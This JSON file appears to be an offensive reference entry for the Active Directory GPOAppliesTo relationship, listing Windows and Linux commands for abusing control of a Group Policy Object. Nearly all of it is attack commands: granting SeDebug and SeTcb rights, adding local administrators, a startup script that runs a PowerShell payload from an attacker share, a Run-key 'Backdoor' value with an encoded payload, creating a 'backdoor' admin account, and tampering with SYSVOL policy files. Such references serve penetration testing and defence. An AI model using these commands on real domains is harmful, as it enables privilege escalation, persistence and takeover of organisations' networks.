{
    "GPOAppliesTo": {
        "meaning": "The GPOAppliesTo relationship connects a Group Policy Object (GPO) to an AD account (user or computer) that the GPO settings affect. This relationship is created when the GPO is linked to the domain or an organizational unit (OU) containing the account. Control over the GPO can be abused to compromise the AD account by modifying the GPO policy settings.",
        "common": "",
        "windows": {
            "SharpGPOAbuse": [
                {
                    "order": 1,
                    "command": "SharpGPOAbuse.exe --AddUserRights --UserRights \"SeTcbPrivilege,SeDebugPrivilege\" --UserAccount controlled.user --GPOName \"Default Domain Policy\"",
                    "description": "Add user rights to a controlled user via GPO modification"
                },
                {
                    "order": 2,
                    "command": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount controlled.user --GPOName \"Default Domain Policy\"",
                    "description": "Add user to local administrators group via GPO modification"
                },
                {
                    "order": 3,
                    "command": "SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents \"powershell.exe -ExecutionPolicy Bypass -File \\\\attacker\\share\\payload.ps1\" --GPOName \"Default Domain Policy\"",
                    "description": "Add computer startup script via GPO modification"
                }
            ],
            "PowerShell_GPO_Commands": [
                {
                    "order": 1,
                    "command": "Get-GPO -Name \"Default Domain Policy\" | Get-GPPermissions -All",
                    "description": "Enumerate GPO permissions to identify modification capabilities"
                },
                {
                    "order": 2,
                    "command": "Set-GPRegistryValue -Name \"Default Domain Policy\" -Key \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -ValueName \"Backdoor\" -Type String -Value \"powershell.exe -enc <base64_payload>\"",
                    "description": "Add registry entry via GPO to execute payload on affected computers"
                },
                {
                    "order": 3,
                    "command": "gpupdate /force",
                    "description": "Force Group Policy update to apply changes immediately"
                }
            ]
        },
        "linux": {
            "pyGPOAbuse": [
                {
                    "order": 1,
                    "command": "python3 pygpoabuse.py DOMAIN/user:password@dc-ip -gpo-id \"{GPO-GUID}\"",
                    "description": "Enumerate GPO settings and permissions using pyGPOAbuse"
                },
                {
                    "order": 2,
                    "command": "python3 pygpoabuse.py DOMAIN/user:password@dc-ip -gpo-id \"{GPO-GUID}\" -powershell-command \"Add-LocalGroupMember -Group 'Administrators' -Member 'DOMAIN\\controlled.user'\"",
                    "description": "Add user to local administrators via GPO PowerShell command modification"
                },
                {
                    "order": 3,
                    "command": "python3 pygpoabuse.py DOMAIN/user:password@dc-ip -gpo-id \"{GPO-GUID}\" -command \"net user backdoor Password123! /add && net localgroup administrators backdoor /add\"",
                    "description": "Create backdoor user account via GPO scheduled task"
                }
            ],
            "LDAP_GPO_Modification": [
                {
                    "order": 1,
                    "command": "ldapsearch -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'CN=Policies,CN=System,DC=domain,DC=com' '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath",
                    "description": "Enumerate GPOs and their file system paths via LDAP"
                },
                {
                    "order": 2,
                    "command": "smbclient //dc.domain.com/SYSVOL -U 'DOMAIN/user%password' -c 'get Policies/{GPO-GUID}/Machine/Registry.pol'",
                    "description": "Download GPO registry policy file for modification"
                },
                {
                    "order": 3,
                    "command": "# Modify Registry.pol file and upload back to SYSVOL",
                    "description": "Modify GPO policy files and upload back to SYSVOL share"
                }
            ]
        }
    }
}
